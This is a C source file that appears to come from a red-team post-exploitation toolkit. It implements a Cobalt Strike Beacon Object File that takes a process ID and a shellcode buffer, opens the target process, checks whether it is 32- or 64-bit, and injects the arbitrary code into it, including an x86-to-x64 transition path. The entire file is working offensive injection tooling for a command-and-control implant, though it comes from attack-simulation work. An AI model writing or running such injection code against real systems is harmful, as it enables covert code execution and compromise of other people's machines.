/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationProcess );
	D_API( NtOpenProcess );
	D_API( NtClose );
} API ;

BOOL IsProcessWow64( _In_ PVOID Process )
{
	API	Api;

	BOOLEAN	Ret = FALSE;

	PVOID	Wow = NULL;
	HANDLE	Ntl = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Reference */
	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {

		Api.NtQueryInformationProcess = C_PTR( GetProcAddress( Ntl, "NtQueryInformationProcess" ) );

		/* Query whether its a WOW64 process */
		if ( NT_SUCCESS( Api.NtQueryInformationProcess( Process, ProcessWow64Information, &Wow, sizeof( Wow ), NULL ) ) ) {
			/* Is it wow64? */
			if ( Wow != NULL ) {
				/* Status */
				Ret = TRUE;
			};
		};

		/* Dereference */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Return Status */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Inserts arbitrary code into a target process using
 * PROCESS_CREATE_THREAD and PROCESS_QUERY_INFORMATION
 * access rights.
 *
!*/
VOID InjectExplicitGo( _In_ PVOID Argv, _In_ INT Argc, _In_ BOOLEAN x64 )
{
	API			Api;
	datap			Psr;
	CLIENT_ID		Cid;
	OBJECT_ATTRIBUTES	Att;

	DWORD			Pid = 0;
	DWORD			Ofs = 0;
	DWORD			Len = 0;
	DWORD			Ret = 0;

	PVOID			Buf = NULL;
	PVOID			Wow = NULL;
	HANDLE			Ntl = NULL;
	HANDLE			Prc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	/* Reference NTDLL.DLL */
	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {
		/* Resolve NT API's */
		Api.NtOpenProcess = C_PTR( GetProcAddress( Ntl, "NtOpenProcess" ) );
		Api.NtClose       = C_PTR( GetProcAddress( Ntl, "NtClose" ) );

		/* Extract the needed arguments */
		BeaconDataParse( &Psr, Argv, Argc );
		Pid = BeaconDataInt( &Psr );
		Ofs = BeaconDataInt( &Psr );
		Buf = BeaconDataExtract( &Psr, &Len );

		Cid.UniqueThread  = C_PTR( NULL );
		Cid.UniqueProcess = C_PTR( Pid );
		InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );

		/* Open our target process */
		if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_QUERY_INFORMATION, &Att, &Cid ) ) ) {
			do 
			{
			#if defined( _WIN64 )
				if ( IsProcessWow64( Prc ) != FALSE ) {
					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x86 process from an x64 beacon." );
					break;
				};
			#else
				if ( IsProcessWow64( Prc ) != FALSE && x64 != FALSE ) {
					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x64 content into an x86 process." );
					break;
				};
			#endif
				if ( IsProcessWow64( Prc ) != TRUE && x64 != TRUE ) {
					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x86 content into an x64 process." );
					break;
				};
			#if defined( _WIN64 )
				/* x64 -> x64 */
				EnterShellcode( Payload64, Pid, Ofs, Buf, Len );
			#else
				if ( IsProcessWow64( Prc ) != FALSE ) {
					/* x86 -> x86 */
					EnterShellcode( Payload32, Pid, Ofs, Buf, Len );
				} else {
					/* x86 -> x64 */
					EnterShellcode64( Payload64, Pid, Ofs, Buf, Len, 0, NULL, &Ret );
				};
			#endif
			} while ( 0 );

			/* Close the process */
			Api.NtClose( Prc );
		};

		/* Dereference */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
};

VOID InjectExplicitGox64( _In_ PVOID Argv, _In_ INT Argc )
{
	/* Notify we are injecting an x64 payload */
	InjectExplicitGo( Argv, Argc, TRUE );
};

VOID InjectExplicitGox86( _In_ PVOID Argv, _In_ INT Argc )
{
	/* Notify we are injecting an x86 payload */
	InjectExplicitGo( Argv, Argc, FALSE );
};
